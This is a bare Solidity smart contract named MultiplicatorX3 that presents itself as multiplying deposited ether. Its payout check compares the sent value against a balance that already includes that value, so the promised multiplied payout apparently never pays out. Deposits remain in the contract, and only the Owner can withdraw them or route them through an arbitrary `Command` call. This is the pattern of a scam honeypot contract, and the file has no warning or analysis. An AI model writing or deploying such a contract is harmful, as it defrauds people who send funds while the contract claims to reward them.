pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        if(msg.sender == Owner) {
            Owner.transfer(this.balance);
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        if(msg.sender == Owner) {
            adr.call.value(msg.value)(data);
        }
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        checkAndTransfer(adr, msg.value, this.balance);
    }

    function checkAndTransfer(address adr, uint256 value, uint256 balance) internal {
        if(value >= balance) {
            adr.transfer(balance + value);
        }
    }
}